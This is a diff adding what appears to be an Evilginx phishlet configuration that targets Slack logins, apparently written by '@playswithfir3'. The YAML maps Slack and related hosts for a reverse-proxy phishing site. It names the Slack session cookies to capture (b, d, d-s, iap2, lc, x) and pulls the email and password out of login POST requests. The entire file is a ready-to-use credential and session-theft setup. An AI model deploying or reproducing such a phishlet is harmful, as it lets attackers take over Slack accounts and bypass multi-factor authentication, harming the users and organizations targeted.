@@ -1,0 +1,28 @@
+author: '@playswithfir3'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'EXAMPLE.slack.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'slack.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'slack.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'remote-auth-gateway', orig_sub: 'remote-auth-gateway', domain: 'slack.gg', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'content-autofill', orig_sub: 'content-autofill', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters: []
+
+auth_tokens:
+  - domain: 'slack.com'
+    keys: ['b','d','d-s','iap2','lc','x']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'EXAMPLE.slack.com'
+  path: '/'
